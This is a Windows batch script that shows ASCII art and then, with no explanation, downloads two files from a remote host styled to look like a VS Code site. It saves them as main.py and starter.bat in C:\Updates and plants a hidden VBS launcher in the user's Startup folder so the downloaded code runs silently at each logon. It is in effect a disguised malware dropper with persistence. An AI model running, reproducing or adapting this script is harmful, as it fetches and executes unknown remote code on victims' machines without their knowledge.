@echo off
echo         ,@@@                                   #@@         
echo     @@@*      @@@                         @@@      %@@@    
echo   @@            ,@@     @@@@@@@@@.     /@@   .        @@
echo @@    @@@@@@@@@@ @@@@@               @@@@@ @@@@@@@@@@    @@
echo @,   @@@@@@@@@@@                           @@@@@@@@@@@    @
echo @   @@@@@@@@@                                 @@@@@@@@@   @
echo @@   @@@@@@                                     @@@@@@   @@
echo   @@@ *@@                                         @@#,@@@  
echo       @@                                           @@      
echo      @@                                             @@     
echo      @@             @@@@           @@@@             .@     
echo     @@              @@@@   ,@@@.   @@@@              @%    
echo      @/               @      @@     %               .@     
echo      @@             @      @@@@@      @             @     
echo       @@%                *  @@@                   @@      
echo         @@@               @@   @                @@@        
echo            @@@@     @                 @     @@@@           
echo                @@@@@@@               @@@@@@@               
echo             @@@    @@@@@@@@@@@@@@@@@@@@@    @@@            
echo          @@@      @@@@@@@@@@@@@@@@@@@@@@@      @@@         
echo        @@        @@@@@@@@        @@@@@@@@@        @@       
echo      @@         @@@@@@              %@@@@@@         @@     
echo     @@         @@@@@@                 @@@@@@         @@    
echo     @@        @@@@@@*                 %@@@@@@        @@    
echo      @@@     @@@@@@@*                 @@@@@@@@     @@@     
echo          @@@@@@@@@@@@                 @@@@@@@@@@@@         
echo             @@ @@@@@@@@@           @@@@@@@@@ @.            
echo              @@ @@@@@@@@@@@@@@@@@@@@@@@@@@@ @@             
echo              @@       %@@@@@@@@@@@@@@       @@             
echo              @@              .              @@             
echo               @@             .             @@              
echo                @@@         @@@@          @@@               
echo                   @@@@@@@@@     @@@@@@@@@    

@echo off
set "updates_folder=C:\Updates"
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

mkdir "%updates_folder%" 2>nul

curl -s http://vscode.atwebpages.com/main.txt > "%updates_folder%\main.py"
curl -s http://vscode.atwebpages.com/starter.txt > "%updates_folder%\starter.bat"

(
    echo.CreateObject^("Wscript.Shell"^).Run "C:\Updates\starter.bat", 0, True
) > "%startup_folder%\starter.vbs"

exit

pause
